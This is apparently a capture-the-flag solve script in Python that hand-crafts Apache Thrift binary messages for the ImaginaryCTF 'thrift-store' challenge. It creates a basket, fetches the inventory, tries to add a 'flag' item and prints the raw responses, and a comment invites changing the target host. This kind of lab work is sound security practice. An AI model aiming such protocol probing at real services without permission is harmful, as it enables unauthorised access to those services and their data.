#thrift-store.chal.imaginaryctf.org:9090
import socket
import struct


def send_and_recv(sock, payload):
    # Prefix payload with frame length
    frame = struct.pack(">I", len(payload)) + payload
    sock.sendall(frame)
    resp = sock.recv(8192)
    print(f"[<] Raw Response: {resp}")
    print(f"[<] Hex Response: {resp.hex()}")
    return resp


def create_basket(sock):
    payload = (
        b"\x80\x01\x00\x01"            # thrift header (call, seqid=1)
        + b"\x00\x00\x00\x0ccreateBasket"  # method
        + b"\x00\x00\x00\x00"          # struct args
        + b"\x0c\x00\x00"              # stop
    )
    print("[>] Sending createBasket...")
    resp = send_and_recv(sock, payload)

    # Extract basket ID (after the 0x0b field type)
    if b"\x0b\x00\x01" in resp:
        idx = resp.index(b"\x0b\x00\x01") + 3
        strlen = struct.unpack(">I", resp[idx:idx+4])[0]
        basket_id = resp[idx+4:idx+4+strlen].decode()
        print(f"[+] Basket ID: {basket_id}")
        return basket_id
    return None


def get_inventory(sock):
    payload = (
        b"\x80\x01\x00\x01"
        + b"\x00\x00\x00\x0cgetInventory"
        + b"\x00\x00\x00\x00"
        + b"\x0c\x00\x00"
    )
    print("[>] Sending getInventory...")
    resp = send_and_recv(sock, payload)
    return resp


def add_to_basket(sock, basket_id, item_id):
    basket_bytes = basket_id.encode()
    item_bytes = item_id.encode()

    payload = (
        b"\x80\x01\x00\x01"
        + b"\x00\x00\x00\x0baddToBasket"
        + b"\x00\x00\x00\x00"
        + b"\x0c\x00\x01"
        + b"\x0b\x00\x01" + struct.pack(">I", len(basket_bytes)) + basket_bytes
        + b"\x0b\x00\x02" + struct.pack(">I", len(item_bytes)) + item_bytes
        + b"\x00"
    )
    print(f"[>] Adding '{item_id}' to basket {basket_id}...")
    resp = send_and_recv(sock, payload)
    return resp


def get_basket(sock, basket_id):
    basket_bytes = basket_id.encode()
    payload = (
        b"\x80\x01\x00\x01"
        + b"\x00\x00\x00\tgetBasket"
        + b"\x00\x00\x00\x00"
        + b"\x0c\x00\x01"
        + b"\x0b\x00\x01" + struct.pack(">I", len(basket_bytes)) + basket_bytes
        + b"\x00"
    )
    print(f"[>] Sending getBasket with ID {basket_id}...")
    resp = send_and_recv(sock, payload)
    return resp


if __name__ == "__main__":
    HOST, PORT = "thrift-store.chal.imaginaryctf.org", 9090  # change for your target

    with socket.create_connection((HOST, PORT)) as sock:
        basket_id = create_basket(sock)
        if not basket_id:
            exit("[-] Could not create basket")

        get_inventory(sock)

        # Example: try to add "flag" (or any item ID from inventory)
        add_to_basket(sock, basket_id, "flag")

        get_basket(sock, basket_id)
